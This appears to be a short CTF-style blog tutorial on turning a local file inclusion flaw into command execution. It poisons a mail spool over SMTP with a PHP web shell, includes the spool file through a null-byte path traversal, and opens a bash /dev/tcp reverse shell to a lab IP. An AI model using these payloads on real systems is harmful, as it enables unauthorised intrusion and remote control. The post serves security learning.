---
layout: post
title:  "Using LFI and SMTP to Get a Reverse Shell"
date:   2020-02-12 08:12:24 +0530
categories: redteam ctf
---

Local file inclusion or LFI can be used in many ways to execute remote commands and get a reverse shell. Some of them are injecting commands through 
apache access log or injecting commands through error logs. This article is little bit different than those techniques
we are going to send the payload through SMTP(mail) and then we are going to execute remote commands.

This image shows the lfi that I have found,

![LFI by burpsuite](https://raw.githubusercontent.com/janithmalinga/janithmalinga.github.io/master/_images/_fli-smtp-shell/lfi-smtp-1.png)

After finding the LFI, next step step is to write the system command on a file which we know the path, In this tutorial I'm going to write 
the system command that we need to execute in the mail folder using smtp protocol. Here are the commands I used to send a mail including the payload 
that we need to execute.

## Send the mail with payload in it

first connect to the smtp port using telnet,
```
telnet 10.10.10.7 25
```
Sending the email with embeded payload in the body,
```
EHLO test.com

VRFY asterisk@localhost
mail from: test.com
rcpt to: asterisk@localhost
data
Subject: This is exploit
<?php echo system($_REQUEST['cmd']); ?>
.
quit
```
now go to burpsuite and access the file "../../../../../../../..//var/mail/asterisk%00"

![exploit saved in the mail](https://raw.githubusercontent.com/janithmalinga/janithmalinga.github.io/master/_images/_fli-smtp-shell/lfi-smtp-2.png)

Yes we successfully exploited the whoami command n the system.

## Getting the reverse shell

For this task I'm using bash reverse shell on linux. Here is the command,
```
bash -i>& /dev/tcp/10.10.14.3/1337 0>&1
```

Then url encode it,
```
bash+-i>%26+/dev/tcp/10.10.14.3/1337+0>%261
```
using a netcat listner we can catch the reverse shell

![Got the reverse shell](https://raw.githubusercontent.com/janithmalinga/janithmalinga.github.io/master/_images/_fli-smtp-shell/lfi-smtp-3.png)


